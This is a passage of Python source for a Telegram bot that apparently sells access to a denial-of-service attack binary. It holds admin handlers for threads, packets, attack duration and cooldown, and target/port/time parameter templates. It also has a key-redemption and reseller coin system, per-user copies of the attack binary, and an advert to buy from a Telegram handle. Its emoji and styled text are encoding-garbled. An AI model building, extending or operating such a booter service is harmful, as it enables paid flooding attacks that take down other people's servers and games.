        bot.answer_callback_query(call.id, "â›” ð—¬ð—¼ð˜‚ ð—®ð—¿ð—² ð—»ð—¼ð˜ ð—®ð—» ð—®ð—±ð—ºð—¶ð—».")
        return

    filename = call.data.replace("download_", "")
    
    if not os.path.exists(filename):
        bot.answer_callback_query(call.id, "âŒ ð—™ð—¶ð—¹ð—² ð—»ð—¼ð˜ ð—³ð—¼ð˜‚ð—»ð—±.")
        return

    # Convert "Select a file" into the animated progress
    animation_msg = bot.edit_message_text("ðŸ“¥ ð——ð—¼ð˜„ð—»ð—¹ð—¼ð—®ð—±ð—¶ð—»ð—´ ð—³ð—¶ð—¹ð—² [â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘] 0%", call.message.chat.id, call.message.message_id)

    progress_steps = [(20, "â–“â–“â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘"), (50, "â–“â–“â–“â–“â–“â–‘â–‘â–‘â–‘â–‘"), (80, "â–“â–“â–“â–“â–“â–“â–“â–“â–‘â–‘"), (100, "â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“")]
    for progress, bar in progress_steps:
        time.sleep(1)
        bot.edit_message_text(f"ðŸ“¥ ð——ð—¼ð˜„ð—»ð—¹ð—¼ð—®ð—±ð—¶ð—»ð—´ ð—³ð—¶ð—¹ð—² [{bar}] {progress}%", call.message.chat.id, animation_msg.message_id)

    # Send the file after animation
    with open(filename, "rb") as file:
        bot.send_document(call.message.chat.id, file)

    # Convert animation into "File Sent Successfully!"
    bot.edit_message_text("âœ… ð—™ð—¶ð—¹ð—² ð—¦ð—²ð—»ð˜ ð—¦ð˜‚ð—°ð—°ð—²ð˜€ð˜€ð—³ð˜‚ð—¹ð—¹ð˜†!", call.message.chat.id, animation_msg.message_id)

# --------------------------------------------------------------
        
        
    
        
        
# --------------------[ ATTACK SETTINGS ]----------------------

@bot.message_handler(func=lambda message: message.text == "Threads")
def set_threads(message):
    """Admin command to change threads."""
    user_id = str(message.chat.id)
    if user_id in admin_id:
        bot.reply_to(message, "ð—˜ð—»ð˜ð—²ð—¿ ð˜ð—µð—² ð—»ð˜‚ð—ºð—¯ð—²ð—¿ ð—¼ð—³ ð˜ð—µð—¿ð—²ð—®ð—±ð˜€:")
        bot.register_next_step_handler(message, process_new_threads)
    else:
        bot.reply_to(message, "â›”ï¸ ð—¬ð—¼ð˜‚ ð—®ð—¿ð—² ð—»ð—¼ð˜ ð—®ð—» ð—®ð—±ð—ºð—¶ð—».")

def process_new_threads(message):
        new_threads = message.text.strip()
        global threads
        threads = new_threads
        save_config()  # Save changes
        bot.reply_to(message, f"âœ… ð—§ð—µð—¿ð—²ð—®ð—±ð˜€ ð—°ð—µð—®ð—»ð—´ð—²ð—± ð˜ð—¼: {new_threads}")
        
@bot.message_handler(func=lambda message: message.text == "Binary")
def set_binary(message):
    """Admin command to change the binary name."""
    user_id = str(message.chat.id)
    if user_id in admin_id:
        bot.reply_to(message, "ð—˜ð—»ð˜ð—²ð—¿ ð˜ð—µð—² ð—»ð—®ð—ºð—² ð—¼ð—³ ð˜ð—µð—² ð—»ð—²ð˜„ ð—¯ð—¶ð—»ð—®ð—¿ð˜†:")
        bot.register_next_step_handler(message, process_new_binary)
    else:
        bot.reply_to(message, "â›”ï¸ ð—¬ð—¼ð˜‚ ð—®ð—¿ð—² ð—»ð—¼ð˜ ð—®ð—» ð—®ð—±ð—ºð—¶ð—».")

def process_new_binary(message):
    new_binary = message.text.strip()
    global BINARY
    BINARY = new_binary
    save_config()  # Save changes
    bot.reply_to(message, f"âœ… ð—•ð—¶ð—»ð—®ð—¿ð˜† ð—»ð—®ð—ºð—² ð—°ð—µð—®ð—»ð—´ð—²ð—± ð˜ð—¼: `{new_binary}`", parse_mode='Markdown')

@bot.message_handler(func=lambda message: message.text == "Packets")
def set_packets(message):
    """Admin command to change packets."""
    user_id = str(message.chat.id)
    if user_id in admin_id:
        bot.reply_to(message, "ð—˜ð—»ð˜ð—²ð—¿ ð˜ð—µð—² ð—»ð˜‚ð—ºð—¯ð—²ð—¿ ð—¼ð—³ ð—½ð—®ð—°ð—¸ð—²ð˜ð˜€:")
        bot.register_next_step_handler(message, process_new_packets)
    else:
        bot.reply_to(message, "â›”ï¸ ð—¬ð—¼ð˜‚ ð—®ð—¿ð—² ð—»ð—¼ð˜ ð—®ð—» ð—®ð—±ð—ºð—¶ð—».")

def process_new_packets(message):
    new_packets = message.text.strip()
    global packets
    packets = new_packets
    save_config()  # Save changes
    bot.reply_to(message, f"âœ… ð—£ð—®ð—°ð—¸ð—²ð˜ð˜€ ð—°ð—µð—®ð—»ð—´ð—²ð—± ð˜ð—¼: {new_packets}")

@bot.message_handler(func=lambda message: message.text == "Parameters")
def set_command_type(message):
    """Admin command to change the full_command_type using inline buttons."""
    user_id = str(message.chat.id)
    if user_id in admin_id:
        markup = types.InlineKeyboardMarkup(row_width=1)
        btn1 = types.InlineKeyboardButton("parameters 1", callback_data="arg_1")
        btn2 = types.InlineKeyboardButton("parameters 2", callback_data="arg_2")
        btn3 = types.InlineKeyboardButton("parameters 3", callback_data="arg_3")
        markup.add(btn1, btn2, btn3)
        
        bot.reply_to(message, "ðŸ”¹ ð—¦ð—²ð—¹ð—²ð—°ð˜ ð—®ð—» ð—£ð—®ð—¿ð—®ð—ºð—²ð˜ð—²ð—¿ð˜€ ð˜ð˜†ð—½ð—²:", reply_markup=markup)
    else:
        bot.reply_to(message, "â›”ï¸ ð—¬ð—¼ð˜‚ ð—®ð—¿ð—² ð—»ð—¼ð˜ ð—®ð—» ð—®ð—±ð—ºð—¶ð—».")

@bot.callback_query_handler(func=lambda call: call.data.startswith("arg_"))
def process_parameters_selection(call):
    """Handles parameters selection via inline buttons."""
    global full_command_type
    selected_arg = int(call.data.split("_")[1])  # Extract parameters number

    # Update the global command type
    full_command_type = selected_arg
    save_config()  # Save the new configuration

    # Generate response message based on the selected parameters
    if full_command_type == 1:
        response_message = "âœ… ð—¦ð—²ð—¹ð—²ð—°ð˜ð—²ð—± ð—£ð—®ð—¿ð—®ð—ºð—²ð˜ð—²ð—¿ð˜€ 1:\n `<target> <port> <time>`"
    elif full_command_type == 2:
        response_message = "âœ… ð—¦ð—²ð—¹ð—²ð—°ð˜ð—²ð—± ð—£ð—®ð—¿ð—®ð—ºð—²ð˜ð—²ð—¿ð˜€ 2:\n `<target> <port> <time> <threads>`"
    elif full_command_type == 3:
        response_message = "âœ… ð—¦ð—²ð—¹ð—²ð—°ð˜ð—²ð—± ð—£ð—®ð—¿ð—®ð—ºð—²ð˜ð—²ð—¿ð˜€ 3:\n `<target> <port> <time> <packet> <threads>`"
    else:
        response_message = "â—ð—œð—»ð˜ƒð—®ð—¹ð—¶ð—± ð˜€ð—²ð—¹ð—²ð—°ð˜ð—¶ð—¼ð—»."

    bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=response_message, parse_mode='Markdown')
        
@bot.message_handler(func=lambda message: message.text == "Attack Cooldown")
def set_attack_cooldown(message):
    """Admin command to change attack cooldown time."""
    user_id = str(message.chat.id)
    if user_id in admin_id:
        bot.reply_to(message, "ðŸ•’ ð—˜ð—»ð˜ð—²ð—¿ ð—»ð—²ð˜„ ð—®ð˜ð˜ð—®ð—°ð—¸ ð—°ð—¼ð—¼ð—¹ð—±ð—¼ð˜„ð—» (ð—¶ð—» ð˜€ð—²ð—°ð—¼ð—»ð—±ð˜€):")
        bot.register_next_step_handler(message, process_new_attack_cooldown)
    else:
        bot.reply_to(message, "â›”ï¸ ð—¬ð—¼ð˜‚ ð—®ð—¿ð—² ð—»ð—¼ð˜ ð—®ð—» ð—®ð—±ð—ºð—¶ð—».")

def process_new_attack_cooldown(message):
    global ATTACK_COOLDOWN
    try:
        new_cooldown = int(message.text)
        ATTACK_COOLDOWN = new_cooldown
        save_config()  # Save changes
        bot.reply_to(message, f"âœ… ð—”ð˜ð˜ð—®ð—°ð—¸ ð—°ð—¼ð—¼ð—¹ð—±ð—¼ð˜„ð—» ð—°ð—µð—®ð—»ð—´ð—²ð—± ð˜ð—¼: {new_cooldown} ð˜€ð—²ð—°ð—¼ð—»ð—±ð˜€")
    except ValueError:
        bot.reply_to(message, "â—ð—œð—»ð˜ƒð—®ð—¹ð—¶ð—± ð—»ð˜‚ð—ºð—¯ð—²ð—¿! ð—£ð—¹ð—²ð—®ð˜€ð—² ð—²ð—»ð˜ð—²ð—¿ ð—® ð˜ƒð—®ð—¹ð—¶ð—± ð—»ð˜‚ð—ºð—²ð—¿ð—¶ð—° ð˜ƒð—®ð—¹ð˜‚ð—².")
        
@bot.message_handler(func=lambda message: message.text == "Attack Time")
def set_attack_time(message):
    """Admin command to change max attack time."""
    user_id = str(message.chat.id)
    if user_id in admin_id:
        bot.reply_to(message, "â³ ð—˜ð—»ð˜ð—²ð—¿ ð—ºð—®ð˜… ð—®ð˜ð˜ð—®ð—°ð—¸ ð—±ð˜‚ð—¿ð—®ð˜ð—¶ð—¼ð—» (ð—¶ð—» ð˜€ð—²ð—°ð—¼ð—»ð—±ð˜€):")
        bot.register_next_step_handler(message, process_new_attack_time)
    else:
        bot.reply_to(message, "â›”ï¸ ð—¬ð—¼ð˜‚ ð—®ð—¿ð—² ð—»ð—¼ð˜ ð—®ð—» ð—®ð—±ð—ºð—¶ð—».")

def process_new_attack_time(message):
    global MAX_ATTACK_TIME
    try:
        new_attack_time = int(message.text)
        MAX_ATTACK_TIME = new_attack_time
        save_config()  # Save changes
        bot.reply_to(message, f"âœ… ð— ð—®ð˜… ð—®ð˜ð˜ð—®ð—°ð—¸ ð˜ð—¶ð—ºð—² ð—°ð—µð—®ð—»ð—´ð—²ð—± ð˜ð—¼: {new_attack_time} ð˜€ð—²ð—°ð—¼ð—»ð—±ð˜€")
    except ValueError:
        bot.reply_to(message, "â—ð—œð—»ð˜ƒð—®ð—¹ð—¶ð—± ð—»ð˜‚ð—ºð—¯ð—²ð—¿! ð—£ð—¹ð—²ð—®ð˜€ð—² ð—²ð—»ð˜ð—²ð—¿ ð—® ð˜ƒð—®ð—¹ð—¶ð—± ð—»ð˜‚ð—ºð—²ð—¿ð—¶ð—° ð˜ƒð—®ð—¹ð˜‚ð—².")
        
# --------------------------------------------------------------
        

        
        
        
# --------------------[ KEY MANAGEMENT ]----------------------
        
@bot.message_handler(func=lambda message: message.text == "ðŸŽŸï¸ Redeem Key")
def redeem_key_command(message):
    user_id = str(message.chat.id)
    
    # Check if user exists and if their access has expired
    if user_id in users:
        expiration_time = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
        if expiration_time > datetime.datetime.now():
            bot.reply_to(message, "â•ð—¬ð—¼ð˜‚ ð—®ð—¹ð—¿ð—²ð—®ð—±ð˜† ð—µð—®ð˜ƒð—² ð—®ð—°ð˜ð—¶ð˜ƒð—² ð—®ð—°ð—°ð—²ð˜€ð˜€â•")
            return  # User still has access, so we stop here
            
    bot.reply_to(message, "ð—£ð—¹ð—²ð—®ð˜€ð—² ð˜€ð—²ð—»ð—± ð˜†ð—¼ð˜‚ð—¿ ð—¸ð—²ð˜†:")
    bot.register_next_step_handler(message, process_redeem_key)

def process_redeem_key(message):
    user_id = str(message.chat.id)
    key = message.text.strip().upper()

    if key in keys:
        duration_in_hours = keys[key]
        new_expiration_time = datetime.datetime.now() + datetime.timedelta(hours=duration_in_hours)
        users[user_id] = new_expiration_time.strftime('%Y-%m-%d %H:%M:%S')
        save_users()  # Save immediately

        del keys[key]
        save_keys()  # Save immediately

        # Create a copy of the binary with the user ID as suffix
        original_binary = BINARY
        user_binary = f"{BINARY}{user_id}"  # e.g., binary7469108296 
        shutil.copy(original_binary, user_binary)

        bot.reply_to(message, f"âœ… ð—”ð—°ð—°ð—²ð˜€ð˜€ ð—´ð—¿ð—®ð—»ð˜ð—²ð—± ð˜‚ð—»ð˜ð—¶ð—¹: {convert_utc_to_ist(users[user_id])}")
    else:
        bot.reply_to(message, "ðŸ“› ð—žð—²ð˜† ð—²ð˜…ð—½ð—¶ð—¿ð—²ð—± ð—¼ð—¿ ð—¶ð—»ð˜ƒð—®ð—¹ð—¶ð—± ðŸ“›")

# --- Bot Handlers ---
@bot.message_handler(func=lambda message: message.text == "Generate Key")
def generate_key_command(message):
    user_id = str(message.chat.id)

    if user_id in admin_id:  # Ensure it's a list
        markup = types.InlineKeyboardMarkup(row_width=1)
        button1 = types.InlineKeyboardButton("Generate Days", callback_data="admin_days")
        button2 = types.InlineKeyboardButton("Generate Hours", callback_data="admin_hours")
        markup.add(button1, button2)
        bot.send_message(message.chat.id, "âœ… ð—¦ð—²ð—¹ð—²ð—°ð˜ ð—±ð˜‚ð—¿ð—®ð˜ð—¶ð—¼ð—» ð˜ð˜†ð—½ð—²:", reply_markup=markup)

    elif user_id in resellers:
        markup = types.InlineKeyboardMarkup(row_width=1)
        button1 = types.InlineKeyboardButton("1 Day (80 Coins)", callback_data="select_1_day")
        button2 = types.InlineKeyboardButton("7 Days (400 Coins)", callback_data="select_7_days")
        button3 = types.InlineKeyboardButton("30 Days (900 Coins)", callback_data="select_30_days")
        markup.add(button1, button2, button3)
        bot.send_message(message.chat.id, "âœ… ð—¦ð—²ð—¹ð—²ð—°ð˜ ð—® ð—±ð˜‚ð—¿ð—®ð˜ð—¶ð—¼ð—»:" ,reply_markup=markup)
    else:
        bot.reply_to(message, "â›”ï¸ ð—”ð—°ð—°ð—²ð˜€ð˜€ ð——ð—²ð—»ð—¶ð—²ð—±: ð—¬ð—¼ð˜‚ ð—®ð—¿ð—² ð—»ð—¼ð˜ ð—® ð—¿ð—²ð˜€ð—²ð—¹ð—¹ð—²ð—¿ ð—¼ð—¿ ð—®ð—±ð—ºð—¶ð—»")


@bot.callback_query_handler(func=lambda call: call.data in ["admin_days", "admin_hours"])
def handle_admin_selection(call):
    user_id = str(call.message.chat.id)

    if user_id not in admin_id:
        bot.answer_callback_query(call.id, "â›”ï¸ ð—”ð—°ð—°ð—²ð˜€ð˜€ ð——ð—²ð—»ð—¶ð—²ð—±: ð—”ð—±ð—ºð—¶ð—» ð—¼ð—»ð—¹ð˜†")
        return

    time_type = "days" if call.data == "admin_days" else "hours"

    bot.edit_message_text(
        f"âœ… ð—˜ð—»ð˜ð—²ð—¿ ð˜ð—µð—² ð—»ð˜‚ð—ºð—¯ð—²ð—¿ ð—¼ð—³ *{time_type}*:",
        call.message.chat.id, call.message.message_id, parse_mode='Markdown')

    bot.register_next_step_handler(call.message, process_generate_key, user_id, time_type)


@bot.callback_query_handler(func=lambda call: call.data in ["select_1_day", "select_7_days", "select_30_days"])
def handle_reseller_selection(call):
    user_id = str(call.message.chat.id)

    if user_id not in resellers:
        bot.answer_callback_query(call.id, "â›”ï¸ ð—”ð—°ð—°ð—²ð˜€ð˜€ ð——ð—²ð—»ð—¶ð—²ð—±: ð—¥ð—²ð˜€ð—²ð—¹ð—¹ð—²ð—¿ ð—¼ð—»ð—¹ð˜†")
        return

    duration_mapping = {"select_1_day": 1, "select_7_days": 7, "select_30_days": 30}
    days = duration_mapping[call.data]
    cost = KEY_COSTS[days]

    if resellers[user_id]["coins"] < cost:
        bot.edit_message_text("âŒ ð—œð—»ð˜€ð˜‚ð—³ð—³ð—¶ð—°ð—¶ð—²ð—»ð˜ ð—–ð—¼ð—¶ð—»ð˜€!", call.message.chat.id, call.message.message_id)
        return

    # Ask for confirmation
    markup = types.InlineKeyboardMarkup()
    confirm_button = types.InlineKeyboardButton("âœ… Confirm", callback_data=f"confirm_{days}")
    markup.add(confirm_button)

    bot.edit_message_text(
        f"âš¡ ð—–ð—¼ð—»ð—³ð—¶ð—¿ð—º ð—´ð—²ð—»ð—²ð—¿ð—®ð˜ð—¶ð—¼ð—»:\n\n"
        f"ðŸ“… ð——ð˜‚ð—¿ð—®ð˜ð—¶ð—¼ð—»: {days} ð—±ð—®ð˜†ð˜€\n"
        f"ðŸ’° ð—–ð—¼ð˜€ð˜: {cost} ð—°ð—¼ð—¶ð—»ð˜€\n\n"
        f"ðŸ”„ ð—–ð—¹ð—¶ð—°ð—¸ 'âœ… Confirm' ð˜ð—¼ ð—´ð—²ð—»ð—²ð—¿ð—®ð˜ð—² ð˜ð—µð—² ð—¸ð—²ð˜†.",
        call.message.chat.id, call.message.message_id, reply_markup=markup)


@bot.callback_query_handler(func=lambda call: call.data.startswith("confirm_"))
def confirm_reseller_key(call):
    user_id = str(call.message.chat.id)
    days = int(call.data.split("_")[1])
    cost = KEY_COSTS[days]

    if user_id not in resellers or resellers[user_id]["coins"] < cost:
        bot.edit_message_text("âŒ ð—œð—»ð˜€ð˜‚ð—³ð—³ð—¶ð—°ð—¶ð—²ð—»ð˜ ð—–ð—¼ð—¶ð—»ð˜€!", call.message.chat.id, call.message.message_id)
        return

    resellers[user_id]["coins"] -= cost
    save_resellers()

    key = generate_key(f"{days}D")  # Example: 1D, 7D, 30D
    keys[key] = days * 24
    save_keys()

    response = (f"âœ… ð—žð—²ð˜† ð—šð—²ð—»ð—²ð—¿ð—®ð˜ð—²ð—± ð—¦ð˜‚ð—°ð—°ð—²ð˜€ð˜€ð—³ð˜‚ð—¹ð—¹ð˜†!\n\n"
                f"ðŸ”‘ ð—žð—²ð˜†: `{key}`\n"
                f"â³ ð—©ð—®ð—¹ð—¶ð—±ð—¶ð˜ð˜†: {days} ð——ð—®ð˜†ð˜€\n"
                f"ðŸ”° ð—¦ð˜ð—®ð˜ð˜‚ð˜€: ð—¨ð—»ð˜‚ð˜€ð—²ð—±\n"
                f"ðŸ’° ð—–ð—¼ð˜€ð˜: `{cost}` ð—°ð—¼ð—¶ð—»ð˜€")

    bot.edit_message_text(response, call.message.chat.id, call.message.message_id, parse_mode='Markdown')


def process_generate_key(message, user_id, time_type):
    try:
        time_amount = int(message.text)
        if time_amount <= 0:
            raise ValueError("Invalid number")

        duration_in_hours = time_amount if time_type == "hours" else time_amount * 24
        duration = f"{time_amount}{time_type[0].upper()}"  # Example: 7H or 12D

        key = generate_key(duration)
        keys[key] = duration_in_hours
        save_keys()

        response = (f"âœ… ð—žð—²ð˜† ð—šð—²ð—»ð—²ð—¿ð—®ð˜ð—²ð—± ð—¦ð˜‚ð—°ð—°ð—²ð˜€ð˜€ð—³ð˜‚ð—¹ð—¹ð˜†!\n\n"
                    f"ðŸ”‘ ð—žð—²ð˜†: `{key}`\n"
                    f"â³ ð—©ð—®ð—¹ð—¶ð—±ð—¶ð˜ð˜†: {time_amount} {time_type}\n"
                    f"ðŸ”° ð—¦ð˜ð—®ð˜ð˜‚ð˜€: ð—¨ð—»ð˜‚ð˜€ð—²ð—±")

        bot.send_message(message.chat.id, response, parse_mode='Markdown')

    except ValueError:
        bot.send_message(message.chat.id, "â›”ï¸ ð—œð—»ð˜ƒð—®ð—¹ð—¶ð—± ð—¶ð—»ð—½ð˜‚ð˜! ð—˜ð—»ð˜ð—²ð—¿ ð—® ð˜ƒð—®ð—¹ð—¶ð—± ð—»ð˜‚ð—ºð—¯ð—²ð—¿.")

# ------------------------------------------------------------------
        

        
        
        
# --------------------[ ADMIN PANEL SETTINGS ]----------------------
      
@bot.message_handler(func=lambda message: message.text in ["Unused Keys"])
def handle_admin_actions(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.send_message(message.chat.id, "â›” ð—”ð—°ð—°ð—²ð˜€ð˜€ ð——ð—²ð—»ð—¶ð—²ð—±! ð—”ð—±ð—ºð—¶ð—» ð—¼ð—»ð—¹ð˜†.")
        return

    if not keys:
        bot.send_message(message.chat.id, "ð—¡ð—¼ ð˜‚ð—»ð˜‚ð˜€ð—²ð—± ð—¸ð—²ð˜†ð˜€ ð—³ð—¼ð˜‚ð—»ð—±")
        return

    key_list = "ð—¨ð—»ð˜‚ð˜€ð—²ð—± ð—¸ð—²ð˜†ð˜€:\n\n"
    for key, duration in keys.items():
        if duration >= 24:
            days = duration // 24  # Convert hours to days
            hours = duration % 24  # Remaining hours
            if hours > 0:
                key_list += f"ð—¸ð—²ð˜†: `{key}` \nð—©ð—®ð—¹ð—¶ð—±ð—¶ð˜ð˜†: `{days}` days, `{hours}` hours\n\n"
            else:
                key_list += f"ð—¸ð—²ð˜†: `{key}` \nð—©ð—®ð—¹ð—¶ð—±ð—¶ð˜ð˜†: `{days}` days\n\n"
        else:
            key_list += f"ð—¸ð—²ð˜†: `{key}` \nð—©ð—®ð—¹ð—¶ð—±ð—¶ð˜ð˜†: `{duration}` hours\n\n"

    bot.send_message(message.chat.id, key_list, parse_mode="Markdown")


@bot.message_handler(commands=['users'])
def show_users_command(message):
    if str(message.chat.id) not in admin_id:
        return bot.reply_to(message, "â›”ï¸ ð—”ð—°ð—°ð—²ð˜€ð˜€ ð——ð—²ð—»ð—¶ð—²ð—±")

    if not users:
        return bot.reply_to(message, "ð—¡ð—¼ ð˜‚ð˜€ð—²ð—¿ð˜€ ð—³ð—¼ð˜‚ð—»ð—±")

    user_list = "ð—¨ð˜€ð—²ð—¿ð˜€:\n\n"
    for user_id, expiration in users.items():
        expiration_time = datetime.datetime.strptime(expiration, '%Y-%m-%d %H:%M:%S')
        status = "Active ðŸŸ¢" if expiration_time > datetime.datetime.now() else "Inactive ðŸ”´"
        user_list += f"ð—¨ð˜€ð—²ð—¿ ð—œð——: `{user_id}`\n"
        user_list += f"ð—˜ð˜…ð—½ð—¶ð—¿ð—®ð˜ð—¶ð—¼ð—»: `{convert_utc_to_ist(expiration)}`\n"
        user_list += f"ð—¦ð˜ð—®ð˜ð˜‚ð˜€: `{status}`\n\n"

    bot.send_message(message.chat.id, user_list, parse_mode="Markdown")
    

@bot.message_handler(commands=['remove'])
def remove_user_command(message):
    if str(message.chat.id) not in admin_id:
        return bot.reply_to(message, "â›”ï¸ ð—”ð—°ð—°ð—²ð˜€ð˜€ ð——ð—²ð—»ð—¶ð—²ð—±")

    command = message.text.split()
    if len(command) != 2:
        return bot.reply_to(message, "ð—¨ð˜€ð—®ð—´ð—²: /ð—¿ð—²ð—ºð—¼ð˜ƒð—² <ð˜‚ð˜€ð—²ð—¿_ð—¶ð—±>")

    target_user_id = command[1]
    if target_user_id in users:
        del users[target_user_id]
        save_users()
        binary_file = f"{BINARY}{target_user_id}"
        if os.path.exists(binary_file):
            os.remove(binary_file)
        response = f"ð—¨ð˜€ð—²ð—¿ {target_user_id} ð—¿ð—²ð—ºð—¼ð˜ƒð—²ð—± ðŸ‘"
    else:
        response = f"ð—¨ð˜€ð—²ð—¿ {target_user_id} ð—»ð—¼ð˜ ð—³ð—¼ð˜‚ð—»ð—±"

    bot.reply_to(message, response)
        

        
# --------------------------------------------------------------
        

        
        
        
# --------------------[ ADMIN PANEL SETTINGS ]------------------
        
@bot.message_handler(func=lambda message: message.text == "Add User")
def add_user_command(message):
    if str(message.chat.id) not in admin_id:
        bot.reply_to(message, "â›” ð—”ð—°ð—°ð—²ð˜€ð˜€ ð——ð—²ð—»ð—¶ð—²ð—±: ð—”ð—±ð—ºð—¶ð—» ð—¼ð—»ð—¹ð˜† ð—°ð—¼ð—ºð—ºð—®ð—»ð—± DM TO BUY @NINJAGAMEROP DM TO BUY @NINJAGAMEROP")
        return
        
    bot.send_message(message.chat.id, "*Please enter the User ID:*", parse_mode='Markdown')
    bot.register_next_step_handler(message, ask_duration_unit)

def ask_duration_unit(message):
    user_id = message.text.strip()
    
    # Store user ID temporarily
    bot_data[message.chat.id] = {"user_id": user_id}

    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(types.InlineKeyboardButton("Days", callback_data="days"))
    markup.add(types.InlineKeyboardButton("Hours", callback_data="hours"))

    bot.send_message(message.chat.id, "â³ *Choose an option:*", reply_markup=markup, parse_mode='Markdown')
    
@bot.callback_query_handler(func=lambda call: call.data in ["days", "hours"])
def ask_duration(call):
    bot.answer_callback_query(call.id)

    chat_id = call.message.chat.id
    time_unit = "days" if call.data == "days" else "hours"

    # Store the selected time unit
    bot_data[chat_id]["time_unit"] = time_unit

    # Edit the message to ask for the number of days/hours
    bot.edit_message_text(
        chat_id=chat_id, 
        message_id=call.message.message_id, 
        text=f"*Enter the number of {time_unit}:*", parse_mode='Markdown'
    )

    bot.register_next_step_handler(call.message, add_user_access)

def add_user_access(message):
    chat_id = message.chat.id
    user_data = bot_data.get(chat_id, {})

    if "user_id" not in user_data or "time_unit" not in user_data:
        bot.send_message(chat_id, "âš ï¸ ð—”ð—» ð—²ð—¿ð—¿ð—¼ð—¿ ð—¼ð—°ð—°ð˜‚ð—¿ð—¿ð—²ð—±. ð—£ð—¹ð—²ð—®ð˜€ð—² ð—¿ð—²ð˜€ð˜ð—®ð—¿ð˜ ð˜ð—µð—² ð—½ð—¿ð—¼ð—°ð—²ð˜€ð˜€..")
        return

    user_id = user_data["user_id"]
    time_unit = user_data["time_unit"]

    try:
        duration_value = int(message.text.strip())

        if time_unit == "days":
            duration_in_hours = duration_value * 24
        else:
            duration_in_hours = duration_value

        expiration_time = datetime.datetime.now() + datetime.timedelta(hours=duration_in_hours)
        users[user_id] = expiration_time.strftime('%Y-%m-%d %H:%M:%S')
        save_users()
        
        # Create a copy of the binary with the user ID as suffix
        original_binary = BINARY
        user_binary = f"{BINARY}{user_id}"  # e.g., binary7469108296 
        shutil.copy(original_binary, user_binary)

        bot.send_message(chat_id, f"âœ… ð—¨ð˜€ð—²ð—¿ *{user_id}* ð—µð—®ð˜€ ð—¯ð—²ð—²ð—» ð—´ð—¿ð—®ð—»ð˜ð—²ð—± ð—®ð—°ð—°ð—²ð˜€ð˜€ ð—³ð—¼ð—¿ *{duration_value}* *{time_unit}*!", parse_mode='Markdown')
    
    except ValueError:
        bot.send_message(chat_id, "â— ð—œð—»ð˜ƒð—®ð—¹ð—¶ð—± ð—¶ð—»ð—½ð˜‚ð˜!")
              
@bot.message_handler(func=lambda message: message.text == "Controll Access")
def show_modify_options(message):
    if str(message.chat.id) not in admin_id:
        bot.reply_to(message, "â›” ð—”ð—°ð—°ð—²ð˜€ð˜€ ð——ð—²ð—»ð—¶ð—²ð—±: ð—”ð—±ð—ºð—¶ð—» ð—¼ð—»ð—¹ð˜† ð—°ð—¼ð—ºð—ºð—®ð—»ð—± DM TO BUY @NINJAGAMEROP")
        return

    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("â¬†ï¸ Increase Access", callback_data="increase_access"),
        types.InlineKeyboardButton("â¬‡ï¸ Decrease Access", callback_data="decrease_access")
    )
    
    bot.send_message(message.chat.id, "ðŸ”¹ *Choose an action:*", reply_markup=markup, parse_mode='Markdown')
    
@bot.callback_query_handler(func=lambda call: call.data in ["increase_access", "decrease_access"])
def ask_user_id(call):
    bot.answer_callback_query(call.id)
    
    chat_id = call.message.chat.id
    action = "Increase" if call.data == "increase_access" else "Decrease"

    admin_sessions[chat_id] = {"action": call.data}  # Store action type

    # Edit message to remove buttons and update text
    bot.edit_message_text(
        chat_id=chat_id,
        message_id=call.message.message_id,
        text=f"âœ… *Selected: {action} Access*\n*Enter the User ID:*", parse_mode='Markdown'
    )

    bot.register_next_step_handler(call.message, ask_time_unit)
    
def ask_time_unit(message):
    chat_id = message.chat.id
    user_id = message.text.strip()

    # Validate if user exists
    if user_id not in users:
        bot.reply_to(message, f"âŒ ð—¨ð˜€ð—²ð—¿ {user_id} ð—»ð—¼ð˜ ð—³ð—¼ð˜‚ð—»ð—± ð—¼ð—¿ ð—µð—®ð˜€ ð—»ð—¼ ð—®ð—°ð˜ð—¶ð˜ƒð—² ð—®ð—°ð—°ð—²ð˜€ð˜€.")
        return

    admin_sessions[chat_id]["user_id"] = user_id

    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("Days", callback_data="time_days"),
        types.InlineKeyboardButton("Hours", callback_data="time_hours")
    )

    bot.send_message(chat_id, "â³ *Choose an option:*", reply_markup=markup, parse_mode='Markdown')
    
@bot.callback_query_handler(func=lambda call: call.data in ["time_days", "time_hours"])
def ask_durations(call):
    bot.answer_callback_query(call.id)

    chat_id = call.message.chat.id
    time_unit = "days" if call.data == "time_days" else "hours"

    # Store the selected time unit
    admin_sessions[chat_id]["time_unit"] = time_unit

    # Edit the message to ask for the number of days/hours
    bot.edit_message_text(
        chat_id=chat_id, 
        message_id=call.message.message_id, 
        text=f"*Enter the number of {time_unit}:*", parse_mode='Markdown'
    )

    bot.register_next_step_handler(call.message, process_duration)

def process_duration(message):
    chat_id = message.chat.id
    session = admin_sessions.get(chat_id, {})

    if "user_id" not in session or "action" not in session or "time_unit" not in session:
        bot.send_message(chat_id, "âš ï¸ ð—”ð—» ð—²ð—¿ð—¿ð—¼ð—¿ ð—¼ð—°ð—°ð˜‚ð—¿ð—¿ð—²ð—±. ð—£ð—¹ð—²ð—®ð˜€ð—² ð—¿ð—²ð˜€ð˜ð—®ð—¿ð˜ ð˜ð—µð—² ð—½ð—¿ð—¼ð—°ð—²ð˜€ð˜€.")
        return

    user_id = session["user_id"]
    action = session["action"]
    time_unit = session["time_unit"]

    try:
        duration_value = int(message.text.strip())

        if time_unit == "days":
            duration_in_hours = duration_value * 24
        else:
            duration_in_hours = duration_value

        # Get current expiration time
        current_expiry = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')

        if action == "increase_access":
            new_expiry = current_expiry + datetime.timedelta(hours=duration_in_hours)
            change_type = "ð—²ð˜…ð˜ð—²ð—»ð—±ð—²ð—±"
        else:  # Decrease case
            new_expiry = current_expiry - datetime.timedelta(hours=duration_in_hours)
            change_type = "ð—¿ð—²ð—±ð˜‚ð—°ð—²ð—±"

        # Prevent negative expiration
        if new_expiry < datetime.datetime.now():
